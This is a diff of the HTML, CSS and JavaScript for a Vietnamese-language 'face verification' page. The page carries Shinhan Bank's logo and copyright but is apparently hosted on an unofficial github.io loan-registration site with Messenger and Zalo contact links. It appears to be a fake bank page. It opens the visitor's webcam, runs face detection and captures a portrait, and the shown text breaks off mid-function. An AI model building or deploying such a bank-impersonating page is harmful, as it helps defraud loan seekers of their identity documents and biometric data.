@@ -3,944 +3,530 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <title>Shinhan Bank - Xác Nhận Khuôn Mặt</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" defer></script>
-    <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
+    <title>Quét khuôn mặt</title>
     <style>
-        :root {
-            --primary-color: #003087;
-            --secondary-color: #f5f6f5;
-            --accent-color: #007bff;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
         }
+
         body {
-            font-family: 'Roboto', sans-serif;
-            background-color: var(--secondary-color);
-            transition: background-color 0.3s ease;
-        }
-        .navbar {
-            background-color: var(--primary-color);
-        }
-        .navbar-brand img {
-            height: 50px;
-        }
-        .navbar-nav {
+            background-color: #0f2a44;
+            color: white;
             display: flex;
-            flex-wrap: nowrap;
-            overflow-x: auto;
-            white-space: nowrap;
-            -webkit-overflow-scrolling: touch;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center; /* Căn giữa theo chiều dọc */
+            height: 100vh;
+            overflow: hidden;
         }
-        .navbar-nav .nav-link {
-            color: white !important;
-            transition: color 0.3s;
-            padding: 8px 10px;
-            font-size: 0.9rem;
-            margin: 0 5px;
-        }
-        .navbar-nav .nav-link:hover {
-            color: var(--accent-color) !important;
-        }
-        .step-indicator {
+
+        .status-bar {
+            width: 100%;
+            height: 40px;
+            background-color: transparent;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 1000;
             display: flex;
+            align-items: center;
+            justify-content: space-between; /* Căn nút đóng và logo */
+            padding: 0 10px;
+        }
+
+        .close-button {
+            background-color: #ffffff33;
+            border: none;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            display: flex;
+            align-items: center;
             justify-content: center;
-            margin: 20px 0;
-            position: relative;
-        }
-        .step {
-            padding: 10px 20px;
-            margin: 0 10px;
-            border-radius: 20px;
-            background-color: #d3d3d3;
-            color: #333;
-            font-weight: bold;
-            position: relative;
-            z-index: 1;
-            transition: all 0.3s;
-            font-size: 0.9rem;
-        }
-        .step.active {
-            background-color: var(--accent-color);
+            cursor: pointer;
+            font-size: 16px;
             color: white;
         }
-        .step::before {
-            content: '\f058';
-            font-family: 'Font Awesome 6 Free';
-            font-weight: 900;
-            margin-right: 5px;
+
+        .close-button:hover {
+            background-color: #ffffff66;
         }
-        .step-indicator::before {
-            content: '';
+
+        .logo {
+            height: 30px;
             position: absolute;
-            top: 50%;
-            left: 10%;
-            right: 10%;
-            height: 3px;
-            background-color: #d3d3d3;
-            z-index: 0;
+            left: 50%;
+            transform: translateX(-50%);
         }
-        .progress-percentage {
+
+        .container {
             text-align: center;
-            font-size: 1rem;
-            color: var(--primary-color);
+            padding: 20px;
+            max-width: 100%;
+        }
+
+        .header {
+            font-size: 20px;
+            font-weight: 400;
             margin-bottom: 10px;
         }
-        .upload-section {
-            background: white;
-            padding: 15px;
-            border-radius: 8px;
-            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.1);
-            margin: 15px 0;
+
+        .sub-header {
+            font-size: 14px;
+            font-weight: 300;
+            margin-bottom: 20px;
+            color: #ffffffcc;
         }
-        .upload-section h3 {
-            color: var(--primary-color);
-            border-bottom: 2px solid var(--accent-color);
-            padding-bottom: 8px;
-            margin-bottom: 15px;
-            font-size: 1.2rem;
-        }
-        .upload-section img, #webcamVideo {
-            max-width: 100%;
-            height: auto;
-            margin-top: 10px;
-            border-radius: 5px;
-        }
-        .webcam-container {
+
+        .face-scan-container {
             position: relative;
-            width: 100%;
-            max-width: 320px;
-            aspect-ratio: 1 / 1;
+            width: 220px;
+            height: 220px;
             margin: 0 auto;
-            display: grid;
-            place-items: center;
-            overflow: hidden;
-            border-radius: 50%;
-            border: 1px solid #d3d3d3;
         }
-        #webcamVideo {
+
+        .video-wrapper {
+            position: relative;
             width: 100%;
             height: 100%;
-            object-fit: cover;
             border-radius: 50%;
-        }
-        .face-overlay {
-            position: absolute;
-            top: 10%;
-            left: 10%;
-            width: 80%;
-            height: 80%;
-            border: 2px dashed #ffffff;
-            border-radius: 50%;
-            pointer-events: none;
-            z-index: 10;
-            transition: border-color 0.3s ease, transform 0.3s ease;
-        }
-        .face-detected {
-            border-color: #28a745;
-            transform: scale(1.05);
-        }
-        #webcamStatus {
-            font-size: 1rem;
-            color: #333;
-            z-index: 11;
-            position: relative;
-            border: 2px dashed #ffffff;
-            background: rgba(255, 255, 255, 0.8);
-            padding: 8px 15px;
-            border-radius: 5px;
-            transition: border-color 0.3s ease;
-        }
-        .face-detected + #webcamStatus {
-            border-color: #28a745;
-        }
-        #webcamSuccess {
-            z-index: 11;
-            position: relative;
-        }
-        #retryButton {
-            display: none;
-        }
-        .btn-primary {
-            background-color: var(--primary-color);
-            border-color: var(--primary-color);
-            padding: 3px 4px;
-            font-size: 0.7rem;
-            transition: all 0.3s ease;
-            position: relative;
-            display: inline-flex;
-            align-items: center;
-            gap: 5px;
-        }
-        .btn-primary:hover {
-            background-color: var(--accent-color);
-            border-color: var(--accent-color);
-            transform: translateY(-3px) scale(1.02);
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
-        }
-        .btn-primary i {
-            font-size: 0.7rem;
-        }
-        .btn-secondary, .btn-outline-secondary {
-            padding: 4px 8px;
-            font-size: 0.8rem;
-            transition: transform 0.2s ease;
-        }
-        .btn-secondary:hover, .btn-outline-secondary:hover {
-            transform: translateY(-2px);
-        }
-        .footer-links a {
-            margin: 0 8px;
-            color: var(--primary-color);
-            text-decoration: none;
-            font-size: 0.9rem;
-        }
-        .footer-links a:hover {
-            color: var(--accent-color);
-        }
-        .error {
-            color: #dc3545;
-            font-size: 0.8rem;
-            margin-top: 3px;
-        }
-        .success-message {
-            color: #28a745;
-            font-size: 0.8rem;
-            margin-top: 5px;
-            display: none;
-        }
-        .spinner {
-            display: none;
-            margin-left: 8px;
-        }
-        .modal-body img {
-            max-width: 100%;
-        }
-        .partner-logos {
-            display: none;
-        }
-        .instructions {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            margin-bottom: 15px;
-            flex-wrap: wrap;
-        }
-        .instruction-item {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-size: 0.85rem;
-            color: var(--primary-color);
-        }
-        .instruction-item i {
-            color: var(--accent-color);
-            font-size: 1rem;
-        }
-        .upload-input {
-            margin-top: 15px;
-            font-size: 0.85rem;
-        }
-        #faceImagePreview {
-            margin-top: 10px;
-            max-height: 150px;
+            border: 5px solid #ffffff33;
+            background-color: #ffffff;
             overflow: hidden;
         }
-        #faceImagePreview img {
-            max-height: 150px;
+
+        .video {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            object-fit: cover;
         }
-        #faceImage {
+
+        .scan-circle {
+            position: absolute;
+            top: -5px;
+            left: -5px;
+            width: 230px;
+            height: 230px;
+            border-radius: 50%;
+        }
+
+        .dot {
+            position: absolute;
+            width: 6px;
+            height: 6px;
+            background-color: #ffffff66;
+            border-radius: 50%;
+            transform-origin: center;
+            box-shadow: 0 0 3px #ffffff66;
+        }
+
+        .dot.scanning {
+            animation: blink 1.2s infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% {
+                opacity: 0.3;
+                box-shadow: 0 0 3px #ffffff66;
+            }
+            50% {
+                opacity: 1;
+                box-shadow: 0 0 6px #ffffffcc;
+            }
+        }
+
+        .scan-arrow {
+            position: absolute;
+            bottom: -30px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 24px;
+            color: #ffffff66;
+        }
+
+        .scan-arrow.scanning {
+            animation: rotate 2s linear infinite;
+        }
+
+        @keyframes rotate {
+            from {
+                transform: translateX(-50%) rotate(0deg);
+            }
+            to {
+                transform: translateX(-50%) rotate(360deg);
+            }
+        }
+
+        .mic-button {
+            position: absolute;
+            bottom: 10px;
+            right: 10px;
+            background-color: #ffffff33;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            font-size: 20px;
+        }
+
+        .mic-button.active {
+            background-color: #ffffff66;
+        }
+
+        .status-message {
+            margin-top: 20px;
+            font-size: 24px;
+            font-weight: 500;
+            text-transform: uppercase;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            opacity: 1;
+            transition: opacity 0.3s ease;
+        }
+
+        .status-message.fade {
+            opacity: 0;
+        }
+
+        .status-message span {
+            font-size: 24px;
+        }
+
+        .error-message {
+            margin-top: 10px;
+            color: #ff5555;
+            font-size: 14px;
             display: none;
         }
-        .button-group {
-            display: flex;
-            justify-content: center;
-            gap: 8px;
-            flex-wrap: wrap;
-        }
-        .accordion-button {
-            position: relative;
-            padding-left: 40px;
-        }
-        .accordion-button::before {
-            content: '';
-            position: absolute;
-            left: 10px;
-            top: 50%;
-            transform: translateY(-50%);
-            width: 20px;
-            height: 2px;
-            background-color: var(--primary-color);
-            box-shadow: 
-                0 -6px 0 0 var(--primary-color),
-                0 6px 0 0 var(--primary-color);
-        }
-        .accordion-button:not(.collapsed)::before {
-            background-color: var(--accent-color);
-            box-shadow: 
-                0 -6px 0 0 var(--accent-color),
-                0 6px 0 0 var(--accent-color);
-        }
-        @media (max-width: 768px) {
-            .navbar-brand img {
-                height: 35px;
+
+        @media (max-width: 400px) {
+            .container {
+                padding: 10px;
             }
-            .navbar-nav {
-                flex-wrap: nowrap;
-                overflow-x: auto;
-                padding-bottom: 10px;
-                gap: 5px;
+
+            .header {
+                font-size: 18px;
+                margin-bottom: 8px;
             }
-            .navbar-nav .nav-link {
-                font-size: 0.9rem;
-                padding: 8px 12px;
-                margin: 0 2px;
-                min-width: 80px;
-                text-align: center;
-            }
-            .step-indicator {
-                display: flex;
-                flex-wrap: nowrap;
-                overflow-x: auto;
-                padding: 10px 0;
-                margin: 10px 0;
-                justify-content: flex-start;
-            }
-            .step {
-                font-size: 0.8rem;
-                padding: 8px 15px;
-                margin: 0 5px;
-                flex: 0 0 auto;
-            }
-            .step-indicator::before {
-                left: 5%;
-                right: 5%;
-            }
-            .progress-percentage {
-                font-size: 1rem;
+
+            .sub-header {
+                font-size: 12px;
                 margin-bottom: 15px;
             }
-            .upload-section {
-                padding: 12px;
-                margin: 10px 0;
+
+            .face-scan-container {
+                width: 220px;
+                height: 220px;
             }
-            .upload-section h3 {
-                font-size: 1.1rem;
+
+            .scan-circle {
+                width: 230px;
+                height: 230px;
+                top: -5px;
+                left: -5px;
             }
-            .webcam-container {
-                max-width: 260px;
-                margin: 10px auto;
+
+            .scan-arrow {
+                font-size: 20px;
+                bottom: -25px;
             }
-            .face-overlay {
-                top: 8%;
-                left: 8%;
-                width: 84%;
-                height: 84%;
+
+            .status-message {
+                margin-top: 15px;
+                font-size: 20px;
             }
-            .webcamStatus {
-                font-size: 0.95rem;
-                padding: 8px 12px;
+
+            .status-message span {
+                font-size: 20px;
+            }
+
+            .logo {
+                height: 26px;
+            }
+        }
+
+        @media (max-width: 350px) {
+            .container {
+                padding: 8px;
+            }
+
+            .header {
+                font-size: 16px;
+                margin-bottom: 6px;
+            }
+
+            .sub-header {
+                font-size: 11px;
+                margin-bottom: 10px;
+            }
+
+            .face-scan-container {
+                width: 200px;
+                height: 200px;
+            }
+
+            .scan-circle {
+                width: 210px;
+                height: 210px;
+                top: -5px;
+                left: -5px;
+            }
+
+            .scan-arrow {
+                font-size: 18px;
+                bottom: -20px;
+            }
+
+            .status-message {
                 margin-top: 10px;
+                font-size: 18px;
             }
-            .btn-primary, .btn-secondary, .btn-outline-secondary {
-                width: auto;
-                min-width: 100px;
-                padding: 8px 12px;
-                font-size: 0.9rem;
-                margin-bottom: 10px;
-                border-radius: 6px;
+
+            .status-message span {
+                font-size: 18px;
             }
-            .btn-primary {
-                padding: 10px 16px;
-                font-size: 1rem;
-                font-weight: bold;
+
+            .logo {
+                height: 22px;
             }
-            .btn-primary i {
-                font-size: 0.9rem;
+        }
+
+        @media (max-width: 320px) {
+            .container {
+                padding: 5px;
             }
-            .btn-primary.continue-btn {
-                width: 100%;
-                max-width: 280px;
-                padding: 10px 14px;
-                font-size: 1rem;
-                font-weight: 700;
-                text-transform: uppercase;
-                border-radius: 10px;
-                background: linear-gradient(45deg, var(--primary-color), var(--accent-color));
-                border: none;
-                display: flex;
-                justify-content: center;
-                align-items: center;
-                gap: 8px;
+
+            .header {
+                font-size: 14px;
+                margin-bottom: 5px;
             }
-            .btn-primary.continue-btn:hover {
-                background: linear-gradient(45deg, var(--accent-color), var(--primary-color));
-                transform: translateY(-2px) scale(1.03);
-                box-shadow: 0 6px 16px rgba(0, 0, 0, 0.3);
+
+            .sub-header {
+                font-size: 10px;
+                margin-bottom: 8px;
             }
-            .btn-primary.continue-btn .spinner {
-                margin-left: 10px;
-                vertical-align: middle;
+
+            .face-scan-container {
+                width: 180px;
+                height: 180px;
             }
-            .instructions {
-                flex-direction: column;
-                gap: 10px;
-                margin-bottom: 20px;
+
+            .scan-circle {
+                width: 190px;
+                height: 190px;
+                top: -5px;
+                left: -5px;
             }
-            .instruction-item {
-                font-size: 0.9rem;
+
+            .scan-arrow {
+                font-size: 16px;
+                bottom: -18px;
             }
-            .instruction-item i {
-                font-size: 1.1rem;
-            }
-            .upload-input {
-                font-size: 0.9rem;
-                margin-top: 20px;
-            }
-            .error, .success-message {
-                font-size: 0.95rem;
+
+            .status-message {
                 margin-top: 8px;
+                font-size: 16px;
             }
-            .button-group {
-                gap: 10px;
-                flex-direction: column;
-                align-items: center;
+
+            .status-message span {
+                font-size: 16px;
             }
-            .nav-buttons {
-                gap: 10px;
-                flex-direction: column;
-                align-items: stretch;
+
+            .mic-button {
+                width: 36px;
+                height: 36px;
+                font-size: 18px;
             }
-            .nav-buttons .btn-outline-secondary,
-            .nav-buttons .btn-primary {
-                align-self: stretch;
+
+            .close-button {
+                width: 26px;
+                height: 26px;
+                font-size: 14px;
             }
-            .footer-links a {
-                font-size: 0.85rem;
-                margin: 5px;
-            }
-            .face-verification-text {
-                font-size: 0.9rem;
-                line-height: 1.4;
-                margin-bottom: 10px;
+
+            .logo {
+                height: 20px;
             }
         }
     </style>
 </head>
 <body>
-    <header>
-        <nav class="navbar navbar-expand-lg">
-            <div class="container">
-                <a class="navbar-brand" href="#"><img src="https://shinhan.com.vn/public/themes/shinhan/img/shinhan_logo_2.svg" alt="Shinhan Bank Logo"></a>
-                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
-                    <span class="navbar-toggler-icon"></span>
-                </button>
-                <div class="collapse navbar-collapse" id="navbarNav">
-                    <ul class="navbar-nav ms-auto">
-                        <li class="nav-item"><a class="nav-link" href="https://vaytieudung.github.io/shinhanbank/pages/vi/gioi-thieu.html">GIỚI THIỆU</a></li>
-                        <li class="nav-item"><a class="nav-link" href="https://vaytieudung.github.io/shinhanbank/pages/vi/tham-chieu.html">LỢI ÍCH</a></li>
-                        <li class="nav-item"><a class="nav-link" href="https://vaytieudung.github.io/shinhanbank/pages/vi/lai-suat-vay.html">GIẤY TỜ CẦN THIẾT</a></li>
-                        <li class="nav-item"><a class="nav-link active" href="https://vaytieudung.github.io/shinhanbank/pages/vi/loan_registration.html">ĐĂNG KÝ TRỰC TUYẾN</a></li>
-                        <li class="nav-item"><a class="nav-link" href="https://vaytieudung.github.io/shinhanbank/pages/vi/lai-suat-tien-gui.html">XEM KẾT QUẢ</a></li>
-                        <li class="nav-item"><a class="nav-link" href="https://vaytieudung.github.io/shinhanbank/pages/vi/dieu-khoan-su-dung.html">ĐIỀU KHOẢN SỬ DỤNG</a></li>
-                        <li class="nav-item"><a class="nav-link" href="https://m.me/shinhanfinancer?hash=AbbheNwiAth9Hcp7&source_id=8585216">LIÊN HỆ</a></li>
-                        <li class="nav-item"><a class="nav-link" href="https://m.me/shinhanfinancer?hash=AbbheNwiAth9Hcp7&source_id=8585216">MESSENGER</a></li>
-                    </ul>
-                </div>
+    <div class="status-bar">
+        <button class="close-button" id="close-button">✖</button>
+        <img src="https://shinhan.com.vn/public/themes/shinhan/img/shinhan_logo_2.svg" class="logo" alt="Shinhan Bank Logo">
+    </div>
+    <div class="container">
+        <div class="header">Xác thực khuôn mặt</div>
+        <div class="sub-header">Hãy để khuôn mặt vào hình tròn</div>
+        <div class="face-scan-container">
+            <div class="video-wrapper">
+                <video id="video" class="video" autoplay></video>
             </div>
-        </nav>
-    </header>
-
-    <main class="container mt-3">
-        <div class="progress-percentage">Bước cuối cùng (Bước 3/3)</div>
-        <div class="step-indicator">
-            <div class="step">1. Nhập thông tin</div>
-            <div class="step">2. Xác thực và xử lý</div>
-            <div class="step active">3. Hoàn thành</div>
+            <div class="scan-circle" id="scan-circle"></div>
+            <div class="mic-button" id="mic-button">🎙️</div>
+            <div class="scan-arrow" id="scan-arrow">⟳</div>
         </div>
-
-        <div id="faceVerificationContent">
-            <p class="text-center face-verification-text">Chụp hoặc tải ảnh lên.</p>
-
-            <div class="accordion" id="faceAccordion">
-                <div class="accordion-item">
-                    <h2 class="accordion-header">
-                        <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#webcamSection" aria-expanded="true" aria-controls="webcamSection">
-                            Xác Nhận Khuôn Mặt
-                        </button>
-                    </h2>
-                    <div id="webcamSection" class="accordion-collapse collapse show" data-bs-parent="#faceAccordion">
-                        <div class="accordion-body">
-                            <div class="webcam-container">
-                                <video id="webcamVideo" autoplay playsinline muted></video>
-                                <canvas id="webcamCanvas" style="display: none;"></canvas>
-                                <div class="face-overlay" id="faceOverlay"></div>
-                            </div>
-                            <p id="webcamStatus" class="text-center mt-2">Đang chờ khuôn mặt...</p>
-                            <p id="webcamError" class="error text-center"></p>
-                            <p id="webcamSuccess" class="success-message text-center">Ảnh chân dung đã được xác nhận!</p>
-                            <div class="text-center mt-2 button-group">
-                                <button class="btn btn-primary" onclick="document.getElementById('faceImage').click()" title="Tải ảnh chân dung từ thiết bị">Chụp ảnh</button>
-                                <input type="file" id="faceImage" accept="image/jpeg,image/png" aria-label="Tải ảnh chân dung">
-                                <button id="retryButton" class="btn btn-secondary" onclick="resetWebcam()">Thử Lại</button>
-                            </div>
-                            <div class="upload-input text-center">
-                                <div id="faceImagePreview"></div>
-                                <p id="faceImageError" class="error"></p>
-                                <p id="faceImageSuccess" class="success-message">Ảnh chân dung đã được xác nhận!</p>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <div class="d-flex justify-content-between mt-2 flex-column flex-md-row nav-buttons">
-                <button class="btn btn-primary continue-btn position-relative me-0" onclick="nextStep()">
-                    TIẾP TỤC
-                    <span class="spinner-border spinner-border-sm spinner" role="status" aria-hidden="true"></span>
-                </button>
-            </div>
+        <div class="status-message" id="status-message">
+            VUI LÒNG CƯỜI <span>😊</span>
         </div>
-    </main>
-
-    <div class="modal fade" id="errorModal" tabindex="-1" aria-labelledby="errorModalLabel" aria-hidden="true">
-        <div class="modal-dialog">
-            <div class="modal-content">
-                <div class="modal-header">
-                    <h5 class="modal-title" id="errorModalLabel">Lỗi</h5>
-                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
-                </div>
-                <div class="modal-body" id="errorModalBody"></div>
-                <div class="modal-footer">
-                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Đóng</button>
-                </div>
-            </div>
+        <div class="error-message" id="error-message">
+            Không thể phát hiện khuôn mặt. Vui lòng thử lại ở nơi có ánh sáng tốt.
         </div>
     </div>
 
-    <footer class="bg-light py-3 mt-4">
-        <div class="container text-center">
-            <div class="footer-links">
-                <a href="https://shinhan.com.vn/vi/page/chinh-sach-bao-mat.html">Chính sách bảo mật</a> |
-                <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/dieu-khoan-su-dung.html">Điều khoản sử dụng</a> |
-                <a href="https://shinhan.com.vn/vi/page/chinh-sach-lien-ket.html">Chính sách Cookies</a> |
-                <a href="https://shinhan.com.vn/vi/page/chinh-sach-lien-ket.html">Miễn khoản từ chối liên kết bên ngoài</a> |
-                <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/dieu-khoan-su-dung.html">Hướng dẫn truy cập web</a> |
-                <a href="https://shinhan.com.vn/vi/page/sitemap-2.html">Sitemap</a> |
-                <a href="https://shinhan.com.vn/vi/page/chinh-sach-lien-ket.html">VNPay</a> |
-                <a href="http://zaloapp.com/qr/p/17z2v4022g92q">ZaloPay</a> |
-                <a href="http://zaloapp.com/qr/p/17z2v4022g92q">Liên hệ</a> |
-                <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/global-shinhan.html">Trang Global Portal</a> |
-                <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/gioi-thieu.html">Giới Thiệu</a>
-            </div>
-            <div class="partner-logos">
-                <a href="https://shinhan.com.vn" target="_blank"><img src="https://shinhan.com.vn/public/themes/shinhan/img/shinhan_logo_2.svg" alt="Shinhan Bank Logo"></a>
-                <img src="https://pg.megapay.vn/pg_was/images/pg/bankContents/PCIDSS.png?v2" alt="PCI DSS">
-             <img src="https://simg.zalopay.com.vn/zst/zlp-website/resources/images/footer/BCTLogo_1.png" alt="Bộ Công Thương">
-            </div>
-            <p class="mt-2">Copyright © 2017 by SHINHAN Bank (Vietnam) Ltd,. All rights reserved.</p>
-        </div>
-    </footer>
-
     <script>
-        // Global variables
-        let videoElement, canvasElement, stream, tempFaceImage = null, modelsLoaded = false;
-        let imageSource = null; // 'capture' or 'upload'
+        const video = document.getElementById('video');
+        const errorMessage = document.getElementById('error-message');
+        const statusMessage = document.getElementById('status-message');
+        const micButton = document.getElementById('mic-button');
+        const scanCircle = document.getElementById('scan-circle');
+        const scanArrow = document.getElementById('scan-arrow');
+        const closeButton = document.getElementById('close-button');
 
-        async function loadModels(attempt = 1, maxRetries = 3) {
-            const primaryUri = 'https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/weights';
-            const fallbackUri = 'https://raw.githubusercontent.com/justadudewhohacks/face-api.js/master/weights';
-            const uri = attempt === maxRetries ? fallbackUri : primaryUri;
-
-            try {
-                await Promise.all([
-                    faceapi.nets.tinyFaceDetector.loadFromUri(uri),
-                    faceapi.nets.faceLandmark68Net.loadFromUri(uri)
-                ]);
-                return true;
-            } catch (error) {
-                if (attempt < maxRetries) {
-                    console.warn(`Model loading failed on attempt ${attempt}. Retrying...`);
-                    return loadModels(attempt + 1, maxRetries);
-                }
-                throw error;
-            }
+        // Tạo các chấm nhỏ cho hiệu ứng quét
+        const numDots = 30;
+        let radius = 115; // Bán kính vòng tròn (230px / 2)
+        if (window.innerWidth <= 400) radius = 115;
+        if (window.innerWidth <= 350) radius = 105;
+        if (window.innerWidth <= 320) radius = 95;
+        for (let i = 0; i < numDots; i++) {
+            const angle = (i / numDots) * 2 * Math.PI;
+            const dot = document.createElement('div');
+            dot.className = 'dot';
+            dot.style.left = `${radius + radius * Math.cos(angle)}px`;
+            dot.style.top = `${radius + radius * Math.sin(angle)}px`;
+            scanCircle.appendChild(dot);
         }
 
-        function init() {
-            document.addEventListener('DOMContentLoaded', async () => {
-                const timeoutPromise = new Promise((_, reject) => {
-                    setTimeout(() => reject(new Error('Tải mô hình quá lâu. Vui lòng kiểm tra mạng hoặc thử lại.')), 30000);
-                });
+        // Cập nhật thông điệp trạng thái với hiệu ứng fade
+        function updateStatusMessage(message, includeEmoji = false) {
+            statusMessage.classList.add('fade');
+            setTimeout(() => {
+                statusMessage.innerHTML = includeEmoji ? `${message} <span>😊</span>` : message;
+                statusMessage.classList.remove('fade');
+            }, 300);
+        }
 
-                try {
-                    await Promise.race([loadModels(), timeoutPromise]);
-                    modelsLoaded = true;
-                } catch (error) {
-                    showErrorModal('Không thể tải mô hình nhận diện khuôn mặt: ' + error.message + '. Vui lòng thử lại.');
-                    console.error('Model loading failed:', error);
+        // Bật/tắt hiệu ứng quét (bao gồm cả chấm nhỏ và mũi tên xoay)
+        function toggleScanEffect(enable) {
+            const dots = document.querySelectorAll('.dot');
+            dots.forEach(dot => {
+                if (enable) {
+                    dot.classList.add('scanning');
+                    scanArrow.classList.add('scanning');
+                } else {
+                    dot.classList.remove('scanning');
+                    scanArrow.classList.remove('scanning');
                 }
-
-                setupWebcam();
-                setupFileInput();
             });
         }
 
-        function setupFileInput() {
-            const input = document.getElementById('faceImage');
-            if (input) {
-                input.addEventListener('change', handleFileUpload);
-            }
-        }
-
-        async function setupWebcam() {
-            videoElement = document.getElementById('webcamVideo');
-            canvasElement = document.getElementById('webcamCanvas');
-            const webcamStatus = document.getElementById('webcamStatus');
-            const faceOverlay = document.getElementById('faceOverlay');
-
-            if (!videoElement || !canvasElement || !webcamStatus || !faceOverlay) {
-                console.error('Required DOM elements are missing.');
-                return;
-            }
-
-            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                showErrorModal('Trình duyệt của bạn không hỗ trợ webcam. Vui lòng sử dụng trình duyệt hiện đại như Chrome, Firefox hoặc Safari.');
-                return;
-            }
-
+        // Truy cập camera
+        async function startCamera() {
             try {
-                stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        width: { ideal: 320 },
-                        height: { ideal: 320 },
-                        facingMode: 'user'
-                    },
+                updateStatusMessage('Đang khởi động camera...');
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: true,
                     audio: false
                 });
-                videoElement.srcObject = stream;
-                webcamStatus.textContent = 'Webcam đã sẵn sàng. Vui lòng chụp hoặc tải ảnh chân dung.';
-                faceOverlay.style.display = 'block';
-                if (modelsLoaded) detectFaces();
-            } catch (error) {
-                if (error.name === 'OverconstrainedError') {
-                    try {
-                        stream = await navigator.mediaDevices.getUserMedia({
-                            video: { width: { ideal: 160 }, height: { ideal: 160 }, facingMode: 'user' },
-                            audio: false
-                        });
-                        videoElement.srcObject = stream;
-                        webcamStatus.textContent = 'Webcam đã sẵn sàng (độ phân giải thấp).';
-                        faceOverlay.style.display = 'block';
-                        if (modelsLoaded) detectFaces();
-                    } catch (fallbackError) {
-                        showErrorModal(`Không thể khởi động webcam: ${getWebcamErrorMessage(fallbackError)}`);
-                    }
-                } else {
-                    showErrorModal(`Không thể khởi động webcam: ${getWebcamErrorMessage(error)}`);
-                }
+                video.srcObject = stream;
+                detectFace();
+            } catch (err) {
+                console.error('Lỗi khi truy cập camera:', err);
+                errorMessage.style.display = 'block';
+                errorMessage.textContent = 'Không thể truy cập camera. Vui lòng kiểm tra quyền truy cập.';
+                updateStatusMessage('Lỗi camera');
             }
         }
 
-        function detectFaces() {
-            if (!modelsLoaded) return;
-            const faceOverlay = document.getElementById('faceOverlay');
-            const webcamStatus = document.getElementById('webcamStatus');
-
-            if (!faceOverlay || !webcamStatus) {
-                console.error('DOM elements for face detection are missing.');
-                return;
-            }
-
-            const detectionInterval = setInterval(async () => {
-                if (!videoElement || videoElement.paused || videoElement.ended) return;
-                try {
-                    const detections = await faceapi.detectAllFaces(videoElement, new faceapi.TinyFaceDetectorOptions());
-                    if (detections.length > 0) {
-                        faceOverlay.classList.add('face-detected');
-                        webcamStatus.textContent = 'Khuôn mặt đã được phát hiện. Nhấn "Chụp" để tiếp tục.';
-                    } else {
-                        faceOverlay.classList.remove('face-detected');
-                        webcamStatus.textContent = 'Không phát hiện khuôn mặt. Vui lòng đặt khuôn mặt vào giữa khung.';
-                    }
-                } catch (error) {
-                    console.error('Error in detectFaces:', error);
-                    clearInterval(detectionInterval);
-                }
-            }, 200);
-        }
-
-        function takeSnapshot() {
-            const errorElement = document.getElementById('webcamError');
-            const successElement = document.getElementById('webcamSuccess');
-            const previewElement = document.getElementById('faceImagePreview');
-            const webcamStatus = document.getElementById('webcamStatus');
-            const retryButton = document.getElementById('retryButton');
-
-            clearMessages();
-
-            if (!canvasElement || !videoElement) {
-                console.error('Canvas or video element missing.');
-                return;
-            }
-
-            canvasElement.width = videoElement.videoWidth;
-            canvasElement.height = videoElement.videoHeight;
-            canvasElement.getContext('2d').drawImage(videoElement, 0, 0);
-            const dataUri = canvasElement.toDataURL('image/jpeg', 0.8);
-
-            if (modelsLoaded) {
-                faceapi.detectAllFaces(canvasElement, new faceapi.TinyFaceDetectorOptions()).then(detections => {
-                    if (detections.length === 0) {
-                        if (errorElement) {
-                            errorElement.textContent = 'Không phát hiện khuôn mặt. Vui lòng thử lại hoặc tải ảnh lên.';
-                        }
-                        if (retryButton) retryButton.style.display = 'inline-block';
-                        return;
-                    }
-                    if (!checkImageBrightness(dataUri)) {
-                        if (errorElement) {
-                            errorElement.textContent = 'Ảnh quá tối. Vui lòng di chuyển đến nơi sáng hơn hoặc bật đèn.';
-                        }
-                        if (retryButton) retryButton.style.display = 'inline-block';
-                        return;
-                    }
-                    if (previewElement) {
-                        previewElement.innerHTML = `<img src="${dataUri}" alt="Ảnh chân dung" style="max-width: 300px;">`;
-                    }
-                    if (webcamStatus) {
-                        webcamStatus.textContent = 'Đã chụp ảnh chân dung.';
-                    }
-                    if (successElement) {
-                        successElement.textContent = 'Ảnh chân dung đã được xác nhận!';
-                        successElement.style.display = 'block';
-                    }
-                    if (retryButton) retryButton.style.display = 'inline-block';
-                    tempFaceImage = dataUri;
-                    imageSource = 'capture';
-                }).catch(error => {
-                    console.error('Error in face detection:', error);
